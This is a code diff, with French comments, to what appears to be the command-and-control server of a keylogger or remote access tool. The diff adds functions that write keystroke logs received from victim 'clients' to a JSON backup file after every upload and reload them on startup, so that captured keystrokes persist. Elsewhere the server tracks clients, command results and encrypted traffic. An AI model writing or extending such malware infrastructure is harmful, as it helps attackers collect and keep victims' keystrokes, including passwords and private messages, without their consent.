@@ -3,6 +3,7 @@ import time
 import threading
 from datetime import datetime
 import os
+import json
 from config import ENCRYPTION_KEY
 from encryptor import Encryptor
 from protocol import Protocol
@@ -18,6 +19,41 @@ command_results = {}
 keylogs_storage = {}
 
 encryptor = Encryptor(ENCRYPTION_KEY)
+
+# Fichier de sauvegarde des keylogs
+KEYLOGS_FILE = "keylogs_backup.json"
+
+
+def load_keylogs_from_file():
+    """Charge les keylogs depuis le fichier de sauvegarde"""
+    global keylogs_storage
+    try:
+        if os.path.exists(KEYLOGS_FILE):
+            with open(KEYLOGS_FILE, 'r') as f:
+                keylogs_storage = json.load(f)
+            print(f"[STORAGE] ✅ Loaded {len(keylogs_storage)} clients' keylogs from {KEYLOGS_FILE}")
+            total_logs = sum(len(logs) for logs in keylogs_storage.values())
+            print(f"[STORAGE] Total keylogs loaded: {total_logs}")
+        else:
+            print(f"[STORAGE] No backup file found, starting fresh")
+    except Exception as e:
+        print(f"[STORAGE] ❌ Error loading keylogs: {e}")
+        keylogs_storage = {}
+
+
+def save_keylogs_to_file():
+    """Sauvegarde les keylogs dans un fichier"""
+    try:
+        with open(KEYLOGS_FILE, 'w') as f:
+            json.dump(keylogs_storage, f)
+        total_logs = sum(len(logs) for logs in keylogs_storage.values())
+        print(f"[STORAGE] ✅ Saved {len(keylogs_storage)} clients' keylogs ({total_logs} total logs)")
+    except Exception as e:
+        print(f"[STORAGE] ❌ Error saving keylogs: {e}")
+
+
+# Charger les keylogs au démarrage
+load_keylogs_from_file()
 
 
 
@@ -445,6 +481,9 @@ def receive_keylog_data():
             # Garder seulement les 1000 derniers logs par client
             if len(keylogs_storage[client_id]) > 1000:
                 keylogs_storage[client_id] = keylogs_storage[client_id][-1000:]
+            
+            # IMPORTANT: Sauvegarder dans le fichier après chaque réception
+            save_keylogs_to_file()
             
             # Mettre à jour le last_seen du client
             if client_id in clients:
